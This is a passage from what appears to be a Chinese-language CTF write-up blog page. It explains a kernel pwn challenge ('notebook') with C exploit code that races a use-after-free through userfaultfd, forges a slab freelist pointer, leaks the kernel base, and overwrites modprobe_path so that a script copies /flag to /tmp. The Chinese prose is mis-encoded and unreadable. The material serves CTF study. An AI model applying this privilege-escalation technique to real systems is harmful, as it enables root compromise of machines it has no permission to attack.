		<span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span><span class="p">);</span>  <span class="c1">//æ³¨å†Œé¡µåœ°å€ä¸é”™è¯¯å¤„ç†FD,è‹¥è®¿é—®åˆ°FAULT_PAGEï¼Œåˆ™è®¿é—®è¢«æŒ‚èµ·ï¼Œuffdä¼šæ¥æ”¶åˆ°ä¿¡å·
</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span> <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">UAF_handler</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">uffd</span><span class="p">)</span> <span class="p">)</span> <span class="c1">// handlerå‡½æ•°è¿›è¡Œè®¿å­˜é”™è¯¯å¤„ç†
</span><span class="c1"></span>		<span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] pthread_create&#34;</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆæ³¨å†Œä¸€ä¸ªuserfaultfd,å†å¦å¤–èµ·ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå¤„ç†,åœ¨<code>UAF_handler</code>ä¸­,æ­¤æ—¶å†…æ ¸ä¼šåœ¨å¯¹ä¸Šè¿°è„šæœ¬ä¸­ <code>mmap</code> åˆ†é…çš„å†…å­˜åœ°å€è¿›è¡Œè®¿é—®çš„æ—¶å€™æŒ‚èµ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">note_del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
		<span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] Error in reading uffd_msg&#34;</span><span class="p">);</span>
	<span class="n">assert</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">event</span> <span class="o">==</span> <span class="n">UFFD_EVENT_PAGEFAULT</span><span class="p">);</span>
	
	<span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">uc</span><span class="p">;</span>
	
	<span class="n">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="n">cookie</span> <span class="o">^</span>  <span class="p">(</span><span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x2500</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">^</span> <span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="n">uint64_t</span> <span class="n">DATA</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">target</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span>

	<span class="n">uc</span><span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">DATA</span><span class="p">;</span>
	<span class="n">uc</span><span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fault_page</span><span class="p">;</span>
	<span class="n">uc</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">fault_page_len</span><span class="p">;</span>
	<span class="n">uc</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>  <span class="c1">// æ¢å¤copy_from_user
</span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºä¸Šé¢æˆ‘ä»¬æ˜¯æƒ³è¦é€šè¿‡<code>write_to_kernel</code>å‡½æ•°å¾€ç¬¬ä¸€ä¸ªslab å†…å­˜å—ä¸­å†™å…¥æ•°æ®,ä½†æ˜¯åœ¨å‡†å¤‡å†™å…¥çš„æ—¶å€™,ä¸»çº¿ç¨‹åœ¨<code>copy_from_user</code>æ—¶æŒ‚èµ·,åŒæ—¶æˆ‘ä»¬åˆèµ·äº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹<code>UAF_handler</code>,åœ¨è¿™ä¸ªæ–°çº¿ç¨‹é‡Œé¢,å› ä¸ºæˆ‘ä»¬æƒ³è¦é€šè¿‡UAFåˆ©ç”¨,æ‰€ä»¥å°†ç¬¬ä¸€ä¸ª <code>slab</code> å†…å­˜å—é‡Šæ”¾,ç„¶åé€šè¿‡<code>userfaultfd</code>æ¢å¤æ•°æ®å†™å…¥(å³æ¢å¤<code>copy_from_user</code>)<br>
å› ä¸ºå †å—å·²ç»é‡Šæ”¾,æ‰€ä»¥å†™å…¥ä¹Ÿæ˜¯å¾€ä¸€ä¸ª<code>free chunk</code>ä¸­å†™å…¥æ•°æ®,å†æŒ‰ç…§slabçš„å¼‚æˆ–ä¿æŠ¤æœºåˆ¶,æ„é€ ä¸€ä¸ªåˆæ³•çš„fd,è¿™é‡Œé€‰æ‹©ç”³è¯·çš„ç›®æ ‡åœ°å€æ˜¯&quot;<code>åœ¨modä¸­ä¿å­˜å †å—åœ°å€ - 0x10</code>&ldquo;çš„ä½ç½®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">data</span> <span class="o">+</span> <span class="mh">0xF0</span><span class="p">)</span> <span class="o">=</span> <span class="n">cookie</span> <span class="o">^</span> <span class="p">(</span><span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x2500</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>

	<span class="n">size_t</span> <span class="n">tmp_chunk</span><span class="p">;</span>
	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">note_add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
		<span class="n">gift</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>
		<span class="n">tmp_chunk</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">mem</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mh">0x10</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="n">tmp_chunk</span> <span class="o">==</span> <span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Next is Target, Has Found, Index: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mh">0xF</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Can not Found the Target&#34;</span><span class="p">);</span>
			<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æœæƒ³è¦ä»»æ„ç”³è¯·å †å—åˆ°ä¸€ä¸ªåœ°å€å¤„,é‚£ä¹ˆå¯¹åº”çš„åœ°å€å¤„åº”è¯¥å­˜æ”¾ä¸€ä¸ª&rdquo;<code>åˆæ³•åœ°å€ ^ chunk ^ cookie</code>&quot;,è€Œå¦‚æœå¯¹åº” <code>*chunk = chunk ^ cookie</code>,é‚£ä¹ˆå°†ä¸å†ç»§ç»­åˆ†é…(å°¾èŠ‚ç‚¹),æ‰€ä»¥æ­¤å¤„è®¾ç½® <code>*(mod_address + 0x2500 - 0x10) = cookie ^ (mod_address + 0x2500 - 0x10)</code>,å³å¯è®©slabåœ¨åˆ†é…å®Œç›®æ ‡åœ°å€åç»ˆæ­¢åˆ†é…<br>
ä¹‹æ‰€ä»¥éœ€è¦åœ¨ç›®æ ‡åœ°å€å¤„æ§åˆ¶æ•°æ®,æ˜¯å› ä¸ºåœ¨ç”³è¯·ç›®æ ‡åœ°å€çš„æœ€å,ä¼šå¯¹å…¶fdä¿å­˜çš„æ•°æ®è¿›è¡Œä¸‹è¿°å¤„ç†,å¦‚æœä¸º0 æˆ–è€… ä¸ºä¸€ä¸ªå †å—åœ°å€,å†å¼‚æˆ–cookieåä¼šæˆä¸ºä¸€ä¸ªéæ³•åœ°å€è®¿é—®å¯¼è‡´å†…æ ¸å´©æºƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">xor</span>     <span class="no">rbx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbx</span><span class="p">]</span>
<span class="nf">xor</span>     <span class="no">rbx</span><span class="p">,</span> <span class="p">[</span><span class="no">r9</span><span class="err">+</span><span class="mi">140</span><span class="no">h</span><span class="p">]</span>
<span class="nf">prefetcht0</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbx</span><span class="p">]</span>
</code></pre></td></tr></table>
</div>
</div><p>ä¸Šè¿°éƒ¨åˆ†,åˆ™ä¼šé€šè¿‡ä¸æ–­çš„ç”³è¯·,å°†æˆ‘ä»¬ä¹‹å‰ä¿®æ”¹è¿‡çš„ <code>free chunk</code> ç»™ç”³è¯·å‡ºæ¥,é‚£ä¹ˆå®ƒä¸‹ä¸€ä¸ªç”³è¯·,å¾ˆå¤§æ¦‚ç‡åˆ™æ˜¯æˆ‘ä»¬çš„ç›®æ ‡åœ°å€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">note_add</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
	
	<span class="n">size_t</span> <span class="n">BUF</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
	<span class="n">BUF</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x168</span><span class="p">;</span>
	<span class="n">BUF</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">;</span>
	<span class="n">BUF</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x2500</span><span class="p">;</span>
	<span class="n">BUF</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="n">BUF</span><span class="p">);</span>
	
	<span class="n">read_from_kernel</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">mem</span><span class="p">);</span>
	<span class="n">kernel_base</span> <span class="o">=</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">mem</span> <span class="o">+</span> <span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x16C</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0xFFFFFFFF00000000</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x476C30</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Kernel_BASE:</span><span class="se">\t</span><span class="s">%lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
	
	<span class="n">size_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x125D2E0</span><span class="p">;</span>
	
	<span class="n">BUF</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
	<span class="n">BUF</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">BUF</span><span class="p">);</span>
	
	<span class="n">strcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="s">&#34;/tmp/copy.sh&#34;</span><span class="p">);</span>
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
	
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /flag /tmp/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /tmp/flag&#39; &gt; /tmp/copy.sh&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/copy.sh&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /tmp/dummy&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/dummy&#34;</span><span class="p">);</span>

	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>åç»­åˆ™æ˜¯æ§åˆ¶å¯¹åº”çš„å­˜æ”¾å †å—åœ°å€çš„ç»“æ„ä½“æ•°ç»„,æ³„æ¼å†…æ ¸åŸºå€,æœ€åé€šè¿‡ä¿®æ”¹ <code>modprobepath</code> è¿›è¡Œåˆ©ç”¨<br>
å½“ç„¶æš´åŠ›æœç´¢å†…å­˜ä¸­çš„credç»“æ„ä½“,ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œææƒçš„</p>
<h3 id="åè®°">åè®°</h3>
<p>å»å¹´å¼ºç½‘æ¯å½“æ—¶åªä¼šåšå¸¸è§„Pwné¢˜,ä»Šå¹´ç»ˆäºèƒ½åšå‡ºä¸€ä¸ªç®€å•çš„å†…æ ¸Pwn,å·²ç„¶æˆä¸ºä¸€åæ‘¸é±¼CTFé€‰æ‰‹äº†</p>
<h3 id="reference">&ldquo;Reference&rdquo;</h3>
<p><a href="../attachment/notebook.zip">[é™„ä»¶]</a></p>

    </div>
</div>

<div class="container">
    
    <nav class="flex container suggested">
        
        <a rel="prev" href="/articles/cve-2021-3156%E5%8F%8Acve-2019-18634%E5%88%86%E6%9E%90/" title="Previous post (older)">
            <span>Previous</span>
            ä»¥ä¸¤ä¸ªSudoæŒ‡ä»¤ç¼“å†²åŒºæº¢å‡ºCVEè¿›è¡Œåˆ†æ
            </a>
        
        
        
    </nav>
    
</div>
</main>


        </main>
        <footer class="footer flex">
    <section class="container">
        <nav class="footer-links">
            
            <a href="/index.xml">RSS</a>
            
        </nav>
    </section>
    
    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
</footer>
    </body>
</html>